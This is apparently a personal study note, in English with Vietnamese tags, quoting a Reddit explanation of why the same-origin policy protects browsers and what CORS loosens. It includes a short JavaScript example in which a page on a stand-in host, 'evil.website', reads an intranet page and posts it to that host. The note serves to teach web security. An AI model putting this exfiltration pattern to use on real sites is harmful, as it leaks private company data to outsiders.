---
share: true
created: 2023-10-30T14:29
updated: 2024-08-18T15:05
alias: same-origin policy là để trình duyệt bảo vệ người dùng, không phải để bảo vệ máy chủ
---
You are at work and you're connected to your company's intranet. Only people in your company's network can see this special website containing secret documents.

You visit this random website: [https://evil.website](https://evil.website). On this website, there is the following code:
```js
const fetchResult = await fetch("https://yourcompany.website/secret/documents");
const secretsPage = await fetchResult.text();
await fetch("https://evil.website/database/save", { method: "post", body: secretsPage });
```

Same origin policy (enabled on every browser) disallows this. You cannot be on evil.website and make a request to another website. So line 1 would throw an error and the rest of the code wouldn't run, saving you from a nasty situation.

CORS exists to loosen up this rule. Maybe yourcompany.website is totally cool with the above scenario because evil.website is their poorly named trusted partner. So yourcompany.website sets up CORS to tell the browser: "hey if you're making this request from evil.website, it's totally cool with us." Now the above code will work as expected as the browser is satisfied with this exception to the same origin policy.

In the above example, your browser was potentially being abused to exfiltrate company secrets that are only accessible from your network. Same origin policy protects **your browser** from being abused in these ways. CORS is about providing exceptions to this rule.

The misconception here is the following. People set up CORS on their webserver. That's why they expect CORS protects their web server in some way. This is 100% wrong. Setting CORS up properly is about protecting the clients (ie. browsers). The only side-effect CORS has for your webserver is that it may add a few response headers to help out the browser make a decision. The real magic happens on the browser.

Trích từ:: [What is CORS and why is it so annoying : r/reactjs](https://www.reddit.com/r/reactjs/comments/11cyejn/comment/ja77iy4/)

[How to win at CORS - JakeArchibald.com](https://jakearchibald.com/2021/cors/)
![](https://wizardzines.com/images/uploads/why-same-origin-matters.png) 
[[Same-origin policy ngăn chặn việc script ở tab này điều khiển tab kia]]
[[Origin là sự kết hợp của protocol, hostname và port]]